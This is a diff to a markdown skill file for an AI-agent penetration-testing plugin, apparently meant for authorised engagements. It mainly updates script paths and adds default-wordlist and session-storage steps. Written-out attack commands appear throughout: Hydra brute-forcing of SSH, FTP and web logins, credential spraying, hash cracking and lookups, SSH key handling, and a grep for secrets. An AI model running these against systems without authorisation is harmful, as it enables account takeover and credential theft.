@@ -79,7 +79,7 @@ C:\ProgramData\*\*.xml
 ### Hash Types Recognition
 ```bash
 # Execute hash identifier
-scripts/hash-identifier.py "{hash_string}"
+${CLAUDE_PLUGIN_ROOT}/skills/credential-harvesting/scripts/hash-identifier.py "{hash_string}"
 
 # Common formats:
 # MD5: 32 hex characters
@@ -107,15 +107,15 @@ PASS=.*
 ### Storage and Organization
 ```bash
 # Store discovered credentials
-scripts/credential-manager.sh store "{username}" "{password}" "{hash}" "{service}" "{source}"
+${CLAUDE_PLUGIN_ROOT}/skills/credential-harvesting/scripts/credential-manager.sh store "{username}" "{password}" "{hash}" "{service}" "{source}"
 
 # Retrieve credentials
-scripts/credential-manager.sh get --service ssh
-scripts/credential-manager.sh get --username admin
-scripts/credential-manager.sh list
+${CLAUDE_PLUGIN_ROOT}/skills/credential-harvesting/scripts/credential-manager.sh get --service ssh
+${CLAUDE_PLUGIN_ROOT}/skills/credential-harvesting/scripts/credential-manager.sh get --username admin
+${CLAUDE_PLUGIN_ROOT}/skills/credential-harvesting/scripts/credential-manager.sh list
 
 # Export for reporting
-scripts/credential-manager.sh export --format json > credentials.json
+${CLAUDE_PLUGIN_ROOT}/skills/credential-harvesting/scripts/credential-manager.sh export --format json > credentials.json
 ```
 
 ### Credential Database Schema
@@ -149,10 +149,10 @@ scripts/credential-manager.sh export --format json > credentials.json
 ### Credential Reuse Testing
 ```bash
 # Test single credential across all services
-scripts/credential-manager.sh test-all "{username}" "{password}" "{target}"
+${CLAUDE_PLUGIN_ROOT}/skills/credential-harvesting/scripts/credential-manager.sh test-all "{username}" "{password}" "{target}"
 
 # Test all discovered credentials
-scripts/credential-manager.sh spray --target "{ip}" --services "ssh,ftp,smb"
+${CLAUDE_PLUGIN_ROOT}/skills/credential-harvesting/scripts/credential-manager.sh spray --target "{ip}" --services "ssh,ftp,smb"
 ```
 
 ### Default Credentials
@@ -207,7 +207,7 @@ ssh -i {key_file} {user}@{target}
 ### SSH Key Extraction
 ```bash
 # Proper key formatting
-scripts/credential-manager.sh format-key "{raw_key_data}" > formatted_key
+${CLAUDE_PLUGIN_ROOT}/skills/credential-harvesting/scripts/credential-manager.sh format-key "{raw_key_data}" > formatted_key
 chmod 600 formatted_key
 
 # Extract public key from private
@@ -219,17 +219,17 @@ ssh-keygen -y -f {private_key} > {public_key}
 ### Online Cracking
 ```bash
 # Check common online databases
-scripts/hash-lookup.sh "{hash}"
+${CLAUDE_PLUGIN_ROOT}/skills/credential-harvesting/scripts/hash-lookup.sh "{hash}"
 # Checks: crackstation, hashkiller, hashes.org
 ```
 
 ### Offline Cracking Preparation
 ```bash
 # Format for hashcat
-scripts/password-formatter.sh hashcat "{hash_file}" "{hash_type}"
+${CLAUDE_PLUGIN_ROOT}/skills/credential-harvesting/scripts/password-formatter.sh hashcat "{hash_file}" "{hash_type}"
 
 # Format for John
-scripts/password-formatter.sh john "{hash_file}" "{format}"
+${CLAUDE_PLUGIN_ROOT}/skills/credential-harvesting/scripts/password-formatter.sh john "{hash_file}" "{format}"
 
 # Common hashcat examples
 hashcat -m 0 {md5_hash} {wordlist}      # MD5
@@ -302,16 +302,25 @@ grep -r "secret\|token" . 2>/dev/null
 
 ## Credential Testing Automation
 
+### Default Wordlists
+
+If the engagement didn't supply its own username/password lists, fall back to the plugin's configured defaults (set via `default_username_wordlist` / `default_password_wordlist` in the plugin's install-time configuration):
+
+```bash
+USERS_LIST="${user_config.default_username_wordlist}"
+PASSWORDS_LIST="${user_config.default_password_wordlist}"
+```
+
 ### Hydra Integration
 ```bash
 # SSH brute force
-hydra -L users.txt -P passwords.txt ssh://{target}
+hydra -L "$USERS_LIST" -P "$PASSWORDS_LIST" ssh://{target}
 
 # FTP testing
-hydra -l admin -P passwords.txt ftp://{target}
+hydra -l admin -P "$PASSWORDS_LIST" ftp://{target}
 
 # HTTP POST form
-hydra -l admin -P passwords.txt {target} http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
+hydra -l admin -P "$PASSWORDS_LIST" {target} http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
 ```
 
 ### Metasploit Integration
@@ -334,20 +343,27 @@ set PASS_FILE passwords.txt
 
 ## Integration with Session Management
 
-```bash
-# Store credentials in session
-SESSION_ID=$(scripts/session-manager.sh current)
-scripts/state-persistence.sh record "$SESSION_ID" "credentials" "{username}" "{password_hash}"
+`$SESSION_ID` is set earlier in the workflow (`commands/pentest.md` Step 1 exports it when the session is created) — there's no "get the current session" lookup, so use the value already in the environment rather than trying to rediscover it.
 
-# Retrieve for testing
-CREDS=$(scripts/state-persistence.sh get "$SESSION_ID" "*" "credentials")
+```bash
+# Store credentials in the structured credential store for this engagement
+${CLAUDE_PLUGIN_ROOT}/skills/credential-harvesting/scripts/credential-manager.sh store \
+  "{username}" "{password}" "{hash}" "{service}" "{source}"
+
+# Also record the discovery as a state-persistence "credentials" discovery so
+# decision-agent's check-failed logic and cross-session learning can see it
+${CLAUDE_PLUGIN_ROOT}/skills/session-management/scripts/state-persistence.sh store \
+  "credentials" '{"username":"{username}","service":"{service}"}' "$SESSION_ID"
+
+# Retrieve unused discoveries for testing
+${CLAUDE_PLUGIN_ROOT}/skills/session-management/scripts/state-persistence.sh get-unused "credentials"
 ```
 
 ## Reporting Format
 
 Generate credential report:
 ```bash
-scripts/credential-manager.sh report --format markdown
+${CLAUDE_PLUGIN_ROOT}/skills/credential-harvesting/scripts/credential-manager.sh report --format markdown
 
 # Output format:
 # ## Discovered Credentials
